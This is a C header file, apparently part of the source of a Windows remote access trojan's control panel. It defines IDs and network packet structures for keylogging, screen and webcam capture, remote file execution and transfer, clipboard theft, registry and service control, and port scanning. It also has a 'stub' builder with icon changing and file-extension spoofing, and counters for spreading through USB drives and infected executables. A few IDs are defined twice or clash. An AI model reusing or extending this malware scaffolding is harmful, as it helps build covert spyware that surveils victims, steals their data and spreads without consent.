//#include <windows.h>

///////////////Dialog IDs/////////////////

#define DLG_MAIN                   901
#define Keylog_Dlg                 902
#define File_Dlg                   903
#define Task_Dlg                   904
#define STUB_EDIT_Dlg              905
#define About_Dlg                  906
#define WEB_SHOT_Dlg               907
#define ID_CRPT_DLG                908
#define IDD_SETTINGS               909
#define NEW_FOLDER_DLG             910
#define DLOAD_STAT_DLG             911
#define SHOT_STAT_DLG              912
#define STATISTICS_DLG             913
#define IDD_REGMAN_DLG             914
#define ULOAD_STAT_DLG             915
#define AUTH_FAIL_DLG              916
#define BROWSE_WEB_DLG             917
#define HOST_INFO_DLG              918
#define SCAN_PORT_DLG              919
#define CLIP_BOARD_DLG             920
#define WRITE_CBOARD_DLG           921

//////////////Control IDs/////////////////

#define ID_MAIN_MENU               10
#define IDC_LIST                   20
#define IDC_TAB1                   30
#define IDC_LIST2                  40
#define IDC_BTN_LISTEN            101
#define IDC_BTN_QUIT              102
#define IDC_RTRV_BUT              103
#define IDC_DISP_LOG              104
#define ID_MAIN_STATUS            105
#define ID_EDIT_PORTLISTENER      106
#define ID_EDIT_STUB              107
#define ID_TOOLS_TASKMANAGER      108
#define ID_TOOLS_KEYLOGGER        109
#define ID_TOOLS_FILEMANAGER      110
#define IDB_FAIL                  111
#define ID_HELP_ABOUT             112
#define ID_OPTION_EXIT            113
#define IDC_SCREEN_CAP            114
#define IDC_LIST3                 115
#define IDC_TREE1                 116
#define IDB_TREE                  117
#define IDI_ICON                  118
#define FILE_MAIN_TAB             119
#define TASK_MAIN_TAB             120
#define IDC_LIST5                 121
#define IDC_LIST4                 122
#define IDC_FILE_STATUS           123
#define IDC_TASK_STATUS           124
#define ID_TASK_MENU              125
#define IDC_KILL_TASK             126
#define IDC_REFRESH_TASK          127
#define ID_FILE_MENU              128
#define IDC_EXECUTE_FILE          129
#define IDC_DOWNLOAD_FILE         130
#define IDC_DELETE_FILE           131
#define ID_INSTALLED_MENU         132
#define IDC_IEXECUTE_FILE         133
#define IDC_IDOWNLOAD_FILE        134
#define IDC_IDELETE_FILE          135
#define IDC_LIST6                 136
#define IDC_STATIC                137
#define ID_SEARCH_EDIT            138
#define IDC_FSEARCH_BUTTON        139
#define IDC_FSEARCH_GROUP         140
#define ID_SEARCH_EDIT2           141
#define IDC_STATIC2               142
#define ID_MMENU_OPTION_LISTEN    143
#define ID_MMENU_MANUAL           144
#define ID_MMENU_ABOUT            145
#define IDC_MainTAB               146
#define ID_MMENU_EXIT             147
#define IDC_SETTING1_GRP          148
#define ID_MAINPORT_EDIT          149
#define ID_UTILPORT_EDIT          150
#define IDC_SETTING2_GRP          151
#define ID_NO_IP_EDIT1            152
#define ID_NO_IP_EDIT2            153
#define IDC_STATIC3               154
#define IDC_STATIC4               155
#define IDC_STATIC5               156
#define ID_WEBCAM_CAP             157
#define SCR_SHOT_Dlg              158
#define IDC_SCRSHT_STATUS         159
#define IDB_SHOT                  160
#define IDB_BALL                  161
#define IDC_SEP1                  162
#define ID_MMENU_OPTION_STOP      163
#define IDC_SYS_SHTDWN            164
#define IDC_SYS_LGOFF             165
#define IDC_SYS_MOFF              166
#define IDC_SYS_MON               167
#define IDC_EDIT_NAME             168
#define IDC_EDIT_PROCESS          169
#define IDC_EDIT_FILEPORT         170
#define IDC_EDIT_MAINPORT         171
#define IDC_EDIT_IP               172
#define IDR_EXE                   173
#define IDC_BUILD                 174
#define IDC_EDITSTAT1             175
#define IDC_EDITSTAT2             176
#define IDC_EDITSTAT3             177
#define IDC_EDITSTAT4             178
#define IDD_SERVEREDIT            179
#define IDB_ABT                   180
#define IDC_LIST7                 181
#define IDC_WEBSHT_STATUS         182
#define IDI_GREEN                 183
#define IDI_IMG                   184
#define IDI_DOC                   185
#define IDI_MEDIA                 186
#define IDI_WEB                   187
#define IDI_ZIP                   188
#define IDI_TXT                   189
#define IDI_UNK                   190
#define IDI_PDF                   191
#define IDB_TREE2                 192
#define IDB_TREE3                 193
#define IDB_TREE4                 194
#define IDB_TREE5                 195
#define IDC_SYSLINK1              196
#define IDC_FILE                  197
#define IDC_BROWSE                198
#define IDB_PAUSE                 199
#define IDC_BACKUP                200
#define IDC_ADDICON               201
#define IDI_EXE                   202
#define IDC_ICONIMG               203
#define IDC_BUILD                 204
#define IDR_STUB                  205
#define SS_BITMAP                 206
#define IDI_PROC                  207
#define IDB_EXE2                  208
#define IDB_VID                   209
#define IDI_TREE6                 210
#define IDC_LIST8                 220
#define ID_MMENU_OPTION_SETTING   221
#define IDD_KEYLOG                222
#define IDC_KEYS                  223
#define IDC_KEYS2                 224
#define IDC_ID                    225
#define IDC_SET_OK_BUTTON         226
#define IDI_VID2                  227
#define IDC_UPLOAD_FILE           228
#define IDC_NEW_FOLDER            229
#define IDC_RENAME_FILE           230
#define IDC_COPY_FILE             231
#define IDC_PASTE_FILE            232
#define IDC_FOLDER_NAME           233
#define IDC_OK_FOLDER_NAME        234
#define IDC_PROGRESS              235
#define IDC_CANCEL_DLOAD          236
#define IDC_DLPROGRESS            237
#define IDC_DLSTAT                238
#define IDC_PAUSE_DLOAD           239
#define IDC_RESUME_DLOAD          240
#define IDC_DLSTAT_STATUS         241
#define ID_UPLDLPORT_EDIT         242
#define IDB_PASS                  243
#define IDC_CANCEL_SHOT           244
#define IDC_SHOTPROGRESS          246
#define IDC_DLSHOT_STATUS         247
#define IDC_LIST9                 248
#define IDC_DLSTATIC              249
#define IDC_EDIT_STUBNAME         250
#define IDC_EDIT_STUBIMG          251
#define IDC_ADDICON               252
#define IDC_BROWSE_IMG            253
#define IDC_UPLKBSTATIC           254
#define IDC_DLKBSTATIC            255
#define IDC_STATISTICS            256
#define IDC_ACCONSTATIC           257
#define IDC_ALLCONSTATIC          258
#define IDC_TLUPLKBSTATIC         259
#define IDC_TLDLKBSTATIC          260
#define IDC_RESET_DATASTAT        261
#define IDC_INFPCSTATIC           262
#define IDC_INFUSBSTATIC          263
#define IDC_INFFILESTATIC         264
#define IDC_DLFILESTATIC          265
#define IDC_DLFILESIZESTATIC      266
#define IDC_RESET_FILESTAT        267
#define IDC_RESET_SPREADSTAT      268
#define IDC_UPLLFILESTATIC        269
#define IDC_UPLLFILESIZESTATIC    270
#define IDC_REST_ALLSTATS         271
#define IDC_SYSLINK2              272
#define IDC_SYSLINK3              273
#define ID_SERVICE_MENU           274
#define IDC_START_SRVC            275
#define IDC_STOP_SRVC             276
#define IDC_SAVE_LOGS             277
#define IDC_REGTREE               278
#define IDC_REGKEYLIST            279
#define IDB_REG_TREE1             280
#define IDB_REG_TREE2             281
#define IDI_REG_TREE3             282
#define IDI_REG_TREE4             283
#define IDC_REG_STATUS            284
#define ID_TOOLS_REGMAN           285
#define IDI_WINDOWS               286
#define IDB_WORM                  287
#define IDI_SET                   288
#define IDB_SEARCH                289
#define IDB_PLAY                  290
#define IDB_STOP                  291
#define IDI_PAUSE                 292
#define IDM_MIMG1                 293
#define IDB_EXIT                  294
#define IDB_CFIG                  295
#define IDB_SAVE                  296
#define IDI_SAVE                  297
#define IDB_BUILD                 298
#define IDB_ULSTAT                299
#define IDB_DLSTAT                300
#define IDB_ULFILESTAT            301
#define IDB_DLFILESTAT            302
#define IDB_CONN                  303
#define IDB_INFFILE               304
#define IDB_INFUSB                305
#define IDB_LISTEN                306
#define IDB_STOPLISTEN            307
#define IDB_SOCKET                308
#define IDB_ADMIN                 309
#define IDB_SYSCONTROL            310
#define IDB_FILEMAN               311
#define IDB_TASKMAN               312
#define IDB_REGMAN                313
#define IDB_SCRSHT                314
#define IDB_WEBCAM                315
#define IDB_KELOG                 316
#define IDB_SHUTDWN               317
#define IDB_LOGOFF                318
#define IDB_UPLOAD                319
#define IDB_DOWNLOAD              320
#define IDB_NEWFOLDER             321
#define IDB_PROC                  322
#define IDC_CANCEL_ULOAD          323
#define IDC_ULPROGRESS            324
#define IDC_ULSTATIC              325
#define IDB_COPY                  326
#define IDB_PASTE                 327
#define IDB_SPY                   328
#define IDB_INFO                  329
#define IDB_ABTICO                330
#define IDB_DLT                   331
#define IDB_REDO                  332
#define IDB_REFRESH               333
#define IDB_CANCEL                334
#define IDB_WEB                   335
#define IDB_TXT                   336
#define IDB_PDF                   337
#define IDC_CANCELABT             338
#define IDI_CANCELABT             339
#define IDB_EXECUTE               340
#define IDB_MONITOR               341
#define IDB_POWERON               342
#define IDB_POWEROFF              343
#define IDB_TREE6                 344
#define IDB_IMG                   345
#define IDB_DOC                   346
#define IDB_ZIP                   347
#define IDB_MEDIA                 348
#define IDB_UNK                   349
#define IDB_EXE                   350
#define IDB_SETUP                 351
#define IDC_NEXT                  352
#define IDC_BACK                  353
#define IDC_INF                   354
#define IDC_INFPLUS               355
#define IDC_ESTATIC1              356
#define IDC_ESTATIC2              357
#define IDC_ICOSTATIC             358
#define IDC_ESTATIC3              359
#define IDC_ESTATIC4              360
#define IDC_ESTATIC5              361
#define IDC_ESTATIC6              362
#define IDC_ESTATIC7              363
#define IDC_ESTATIC8              364
#define IDC_ESTATIC9              365
#define IDC_ESTATIC10             366
#define IDC_ESTATIC11             367
#define IDC_ESTATIC12             368
#define IDC_EXT_SPOOF             369
#define IDC_ESTATIC13             370
#define IDC_SPOOF                 371
#define IDC_ESTATIC14             372
#define IDC_PASSWORD              373
#define IDC_PASS_EDIT             374
#define SETTING_TAB               375
#define IDC_SSTATIC0              376
#define IDC_SSTATIC1              377
#define IDC_SSTATIC2              378
#define IDC_SSTATIC3              379
#define IDC_SSTATIC4              380
#define IDC_DOWNLOAD_PATH         381
#define IDC_DL_PATHBUTTON         382
#define IDC_KEEP_DLOG             383
#define IDC_SAVE_DPATH1           384
#define IDC_SAVE_DPATH2           385
#define IDC_ESTATIC15             386
#define IDC_ERROR_MSG             387
#define IDC_ERROR_EDT             388
#define IDC_SSTATIC5              389
#define IDC_ERROR_TEST            390
#define IDC_SHOW_DLPROG           391
#define IDC_REFRESH_USR           392
#define IDC_NOT_NEWUSR            393
#define IDC_SSTATIC6              394
#define IDC_AUTO_LISTEN           395
#define IDC_SSTATIC7              396
#define IDC_SERV_PASSEDT          397
#define IDB_INSTALLS              398
#define IDC_RE_AUTH               399
#define IDC_OK_RE_AUTH            400
#define IDC_URL_GO                401
#define IDC_URL_EDIT              402
#define IDC_BROWSE_WEB            403
#define IDB_NETWORK               404
#define IDB_FACEBOOK              405
#define IDB_TWITTER               406
#define IDC_FBLINK                407
#define IDI_FACEBOOK              408
#define IDI_QUESTIONX             409
#define IDC_QUESTIONPASS          500
#define IDI_INFOX                 501
#define IDC_QUESTIONERR           502
#define IDC_SOCKINFO              503
#define IDB_WEBPAGE               504
#define IDC_HOSTINFO_EDIT         505
#define IDC_GRAB_HOSTINFO         506
#define IDC_EXIT_HOSTINFO         507
#define IDI_SAVE2                 508
#define IDB_HOSTINFO              509
#define IDC_HOST_INFO             510
#define IDB_SCANPORT              511
#define IDC_SCAN_PORT             512
#define IDC_LIST11                513
#define IDC_IP_START              514
#define IDC_IP_END                515
#define IDC_START_PORT            516
#define IDC_END_PORT              517
#define IDC_START_SCAN            518
#define IDC_REFRESHTIME           519
#define IDC_SSTATIC8              520
#define IDC_CLEAR_LOG             521
#define IDC_SETPORTS_AUTO         522
#define IDC_SETPORTS_MANUAL       523
#define IDC_ERROR_TITLE           524
#define IDC_AUTOSOCK_GEN          525
#define IDC_MANSOCK_GEN           526
#define IDC_ONE_INSTANCE          527
#define IDC_SHOW_ULPROG           528
#define IDC_REM_CLIPBOARD         529
#define IDC_LIST12                530
#define IDC_REF_CBOARD            531
#define IDC_COPY_CBOARD           532
#define IDC_PASTE_CBOARD          533
#define IDC_WRITE_CBOARD          534
#define IDC_EMPTY_CBOARD          535
#define IDC_PASTE_CBEDT           536
#define IDC_PASTE_CBBTN           537
#define IDI_EXT_MAIN              538
#define IDC_EXT_MAIN              539
#define IDC_EXT_STAT              540
#define IDC_TWEETLINK             541
#define IDI_TWITTER               542
#define ID_SYSTRAY_MENU           543
#define IDC_SHOWACTIVE_PORT       544
#define IDB_REF_CBOARD            545
#define IDB_DLT_CBOARD            546
#define IDB_CPY_CBOARD            547
#define IDB_PST_CBOARD            548
#define IDB_WRT_CBOARD            549

#define IDI_EXT_SCR               550
#define IDC_EXT_SCR               551
#define IDI_SAVE_SCR              552
#define IDC_SAVE_SCR              553

#define IDI_EXT_CAM               554
#define IDC_EXT_CAM               554
#define IDI_SAVE_CAM              556
#define IDC_SAVE_CAM              557



/////////////WinSockIDs////////////////
#define PING                      997
#define WM_UTILITY_SOCKET         998
#define WM_FILE_SOCKET            999
#define WM_SOCKET                 1000
#define COMPUTER_INFO             1001
#define REQ_DRIVES                1002
#define SEND_DRIVES               1006
#define SEND_LOGS                 1007
#define TEST_CONNECTION           1008
#define CONFIRM_ONLINE            1009
#define LOGS_SENT                 1010
#define SEND_FILES                1011
#define REQ_FILES                 1012
#define REQ_TASKS                 1013
#define SEND_TASKS                1014
#define REQ_INSTALLS              1015
#define SEND_INSTALLS             1016
#define CAP_WEBCAM                1017
#define SEND_WEBCAM               1018
#define REQ_WINDOWS               1019
#define SEND_WINDOWS              1020
#define KILL_PROCESS              1021
#define EXECUTE_FILE              1022
#define DOWNLOAD_FILE             1023
#define DELETE_FILE               1024
#define IEXECUTE_FILE             1025
#define IDOWNLOAD_FILE            1026
#define IDELETE_FILE              1027
#define REQ_FILE_SEARCH           1028
#define SEND_FILE_SEARCH          1029
#define REQ_SEARCH_DIR            1030
#define SEND_SEARCH_DIR           1031
#define CAP_SCREEN                1032
#define TURN_OFF_PC               1033
#define TURN_ON_PC                1034
#define SHUT_DOWN_PC              1035
#define LOG_OFF_PC                1036
#define SEND_FOLDERS              1037
#define SET_CAP_SCREEN            1038
#define SET_CAP_CAM               1039
#define END_CAP_SCREEN            1040
#define END_CAP_CAM               1041
#define SET_KEYLOG                1042
#define END_KEYLOG                1043
#define SET_FDLOAD                1044
#define FDLOAD                    1045
#define END_FDLOAD                1046
#define SET_FUPLOAD               1047
#define FUPLOAD                   1048
#define END_FUPLOAD               1049
#define NEW_FOLDER                1050
#define RENAME_FILE               1051
#define COPYnPASTE_FILE           1052
#define INIT_DLFSOCK              1053
#define INIT_FSOCK                1054
#define CANCEL_DLOAD              1055
#define PAUSE_DLOAD               1056
#define RESUME_DLOAD              1057
#define CANCEL_SHOT               1058
#define PAUSE_SHOT                1059
#define RESUME_SHOT               1060
#define REQ_SRVCS                 1061
#define SEND_SRVCS                1062
#define DLOAD_SUSPENDED           1063
#define DLOAD_TERMINATED          1064
#define DLOAD_RESUMED             1065
#define REQ_DATABASE              1066
#define SEND_DATABASE             1067
#define STOP_SERVICE              1068
#define START_SERVICE             1069
#define REQ_REG_MAN               1070
#define SEND_REG_MAN              1071
#define SEND_FILE_SEARCHNUM       1072
#define REQ_SEC_PASS              1073
#define SEND_SEC_PASS             1074
#define AUTH_FAIL                 1075
#define BROWSE_WEB                1076
#define SCAN_PORT                 1077
#define REQ_AUTO_SOCK             1078
#define SEND_AUTO_SOCK            1079
#define REQ_CLIP_BOARD            1080
#define SEND_CLIP_BOARD           1081
#define EMPTY_CLIP_BOARD          1082
#define PASTE_CLIP_BOARD          1083
#define COPY_CLIP_BOARD           1084

////////////////////////////DEFINES/////////////////////////////
#define ListView_SetExtendedListViewStyle(w,s) (DWORD)SNDMSG((w),LVM_SETEXTENDEDLISTVIEWSTYLE,0,(s))
#define LVM_SETEXTENDEDLISTVIEWSTYLE (LVM_FIRST+54)
#define TVM_SETIMAGELIST	(TV_FIRST+9)
#define LVS_EX_FULLROWSELECT 32
#define LVS_EX_GRIDLINES 1
#define LVS_EX_CHECKBOXES 4

#define MAX_KEY_LENGTH           566
#define MAX_LINKID_TEXT          48
#define L_MAX_URL_LENGTH	     2084
#define   MAX_LEN                5444




typedef struct tagLITEM {
	UINT mask;
	int iLink;
	UINT state;
	UINT stateMask;
	WCHAR szID[MAX_LINKID_TEXT];
	/*WCHAR*/char szUrl[L_MAX_URL_LENGTH];
} LITEM,*PLITEM;

typedef struct tagLHITTESTINFO {
	POINT pt;
	LITEM item;
} LHITTESTINFO,*PLHITTESTINFO;

typedef struct tagNMLINK {
	NMHDR hdr;
	LITEM item;
} NMLINK,*PNMLINK;



struct PACKETHEAD
{
    DWORD PacketType;
    ///USER INFO///
    char IP_add[12];
    char cpt_name[70];
    char OS_Ver[50];
    char User[70];
    char Admin[18];
    char Processor_specs[50];
    char RAM_Size[10];
    char Scr_res[15];
    char Time[20];
    ///FILE SYS///
    char Drives[4];
    char Folder[50];
    char File[100];
    char FileSize[25];
    int  File_type;
    char Installs[50];
    char Path[MAX_PATH];
    char FoundFile[MAX_PATH];
    int  FoundNum;
    int  DriveType;
    //char FoundDir[MAX_PATH];
    ///TASK MNGR///
    char Procs[100];
	char PID[7];
	char Threads[7];
	char ParentPID[7];
	char PRIORITY[10];
	char Windows[50];
	char PhyMem[30];
	///SCAN PORT///
	char ScanIP[16];
	char ScanPort[7];
	char ScanStat[7];
	int  ScanImg;
	///SRVC MNGR///
	char Srvcname[70];
	char SrvcDispname[70];
	char SrvcStatus[20];
	char SrvcStartup[15];
	///REG MNGR///
	int RegID;
	char KeyVal[25];
	int datatype;
	char keydata[150];
	char KeyFold[50];
};




////LV_Control////
   /* typedef struct _LV_ITEM {
    UINT   mask;        // attributes of this data structure
    int    iItem;       // index of the item to which this structure refers
    int    iSubItem;    // index of the subitem to which this structure refers
    UINT   state;       // Specifies the current state of the item
    UINT   stateMask;   // Specifies the bits of the state member that are valid.
    LPTSTR  pszText;    // Pointer to a null-terminated string
                        // that contains the item text
    int    cchTextMax;  // Size of the buffer pointed to by the pszText member
    int    iImage;      // index of the list view item's icon
    LPARAM lParam;      // 32-bit value to associate with item
    } _LV_ITEM;

    typedef struct _LV_COLUMN {
    UINT mask;       // which members of this structure contain valid information
    int fmt;         // alignment of the column heading and the subitem text
    int cx;          // Specifies the width, in pixels, of the column.
    LPTSTR pszText;  // Pointer to a null-terminated string
                     // that contains the column heading
    int cchTextMax;  // Specifies the size, in characters, of the buffer
    int iSubItem;    // index of subitem
    } _LV_COLUMN;


typedef struct {
    UINT    mask;        // attributes of this data structure
    LPTSTR  pszText;    // Pointer to a null-terminated string
    //int     iImage;
    //int     iSelectedImage;
    int     cchTextMax;
    int     hItem;
} _TV_ITEM;*/


typedef struct {
   WORD x,y;  // dimensions
   WORD l;    // bytes per scan-line (32-bit allignment)
   BYTE *b;   // bits of bitmap,3 bytes/pixel, BGR
} tWorkBMP;  // 24-bit working bitmap


struct mystruct {
    HBITMAP Screen;
    int ID;
    int ID3;
    int ID4;
} ;


struct EVENTPACKET
{
    DWORD PacketType;
    ///AUTO_PORT///
    int UPort;
    int FPort;
    ///SECURITY//////
    char SEC_PASS[14];
    ///STD//////////////
    char URL[256];
    char TaskName[100];
    char SrvcName[100];
    char FileName[100];
    char Ipath[MAX_PATH];
    char Dpath[MAX_PATH];
    char SearchFile[MAX_PATH];
    //char SearchExtention[MAX_PATH];
    char SearchDir[MAX_PATH];
    char Fcopy[MAX_PATH];
    char Fpaste[MAX_PATH];
    ///REGMAN//////////
    int Hkey_ID;
    char KeyPath[MAX_PATH];
    ///PORT SCAN//////////
    DWORD StartIp;
	  DWORD EndIp;
	  DWORD StartPort;
    DWORD EndPort;
    ///CLIP BOARD///
	  char cliptext[1024];
};






struct FTRANSFER
{
    DWORD PacketType;
    //CAPTURES//
    char Scr_Cap[5041];
    char Cam_Cap[2041];
    char Keylog[3041];
    char ClipBoard[1024];
    unsigned long PicLen;
    unsigned long ActPicLen;
    char PicSize[50];
    int infusb;
    int infexe;
};



struct FILEDOWNLOAD
{
    DWORD PacketType;
    char FDload[4096];
    unsigned long DLFLen;
    char DLFSize[50];
};


struct FILEUPLOAD
{
    DWORD PacketType;
    char FUload[5041];
    char ULFname[MAX_LEN];
    char ULDestPath[MAX_PATH];
    unsigned long ULFLen;
    char ULFSize[50];
};


typedef struct _ICONDIRENTRY {
  BYTE bWidth;
  BYTE bHeight;
  BYTE bColorCount;
  BYTE bReserved;
  WORD wPlanes;
  WORD wBitCount;
  DWORD dwBytesInRes;
  DWORD dwImageOffset;
} ICONDIRENTRY,
 * LPICONDIRENTRY;

typedef struct _ICONDIR {
  WORD idReserved;
  WORD idType;
  WORD idCount;
  ICONDIRENTRY idEntries[1];
} ICONDIR,
 * LPICONDIR;

#pragma pack(push)
#pragma pack(2)
typedef struct _GRPICONDIRENTRY {
  BYTE bWidth;
  BYTE bHeight;
  BYTE bColorCount;
  BYTE bReserved;
  WORD wPlanes;
  WORD wBitCount;
  DWORD dwBytesInRes;
  WORD nID;
} GRPICONDIRENTRY,
 * LPGRPICONDIRENTRY;
#pragma pack(pop)

#pragma pack(push)
#pragma pack(2)
typedef struct _GRPICONDIR {
  WORD idReserved;
  WORD idType;
  WORD idCount;
  GRPICONDIRENTRY idEntries[1];
} GRPICONDIR,
 * LPGRPICONDIR;
#pragma pack(pop)

PIMAGE_DOS_HEADER pidh;
PIMAGE_NT_HEADERS pinh;
PIMAGE_SECTION_HEADER pish;


/*typedef struct _NOTIFYICONDATA {
DWORD cbSize;
HWND hWnd;
UINT uID;
UINT uFlags;
UINT uCallbackMessage;
HICON hIcon;
TCHAR szTip[64];
DWORD dwState;
DWORD dwStateMask;
TCHAR szInfo[256];
union{
    UINT uTimeout;
    UINT uVersion;
};
TCHAR szInfoTitle[64];
DWORD dwInfoFlags;
GUID guidItem;
HICON hBalloonIcon;
} NOTIFYICONDATA, *PNOTIFYICONDATA;*/


#define ICON_ID				71			// ID for our systray icon
#define SYSTRAY_MSG			72			// Message send to the DlgProc when something happend
										// with the icon. When someone clicks on it, for example
                                        // Window procedure for the main dialog


